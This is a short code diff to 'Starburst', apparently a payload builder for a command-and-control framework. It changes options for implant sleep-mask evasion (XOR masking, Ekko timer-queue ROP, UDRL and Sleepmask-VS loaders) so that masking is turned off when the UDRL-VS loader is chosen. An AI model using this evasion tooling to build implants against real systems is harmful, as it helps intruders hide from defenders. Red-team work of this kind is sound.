@@ -294,9 +294,10 @@ class Starburst(PayloadType):
             parameter_type=BuildParameterType.ChooseOne,
             choices=["none", "default", "full_image", "heap", "ekko", "udrl", "sleepmask_vs", "custom"],
             default_value="default",
-            description="Sleep mask type: none (plain sleep), default (XOR sensitive fields), full image XOR, heap masking, Ekko timer-queue ROP (x64), UDRL, Sleepmask-VS, or custom. Use 'none' or 'default' with UDRL-VS to avoid conflicts with the kit's own mask.",
+            description="Sleep mask type: none (plain sleep), default (XOR sensitive fields), full image XOR, heap masking, Ekko timer-queue ROP (x64), UDRL, Sleepmask-VS, or custom.",
             hide_conditions=[
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="elf"),
+                HideCondition(name="loader_type", operand=HideConditionOperand.EQ, value="udrl-vs"),
             ],
         ),
         BuildParameter(
@@ -467,6 +468,8 @@ class Starburst(PayloadType):
                 lt = self.get_parameter("loader_type")
             except Exception:
                 lt = "default"
+            if lt == "udrl-vs":
+                mask = "none"
             if mask == "sleepmask_vs":
                 sm_data_path = os.path.join(dst_path, "include", "evasion", "sleepmask_vs_data.h")
                 if lt == "udrl-vs":
@@ -1087,6 +1090,7 @@ class Starburst(PayloadType):
             loader_type = "default"
         if loader_type == "udrl-vs":
             spoof = "off"
+            mask_type = "none"
         if mask_type == "sleepmask_vs":
             spoof = "off"
         if spoof and spoof != "off":
@@ -1117,6 +1121,8 @@ class Starburst(PayloadType):
             mask = self.get_parameter("sleep_mask")
         except Exception:
             mask = "default"
+        if loader_type == "udrl-vs":
+            mask = "none"
         mask_map = {
             "none": "MASK_NONE",
             "default": "MASK_DEFAULT",
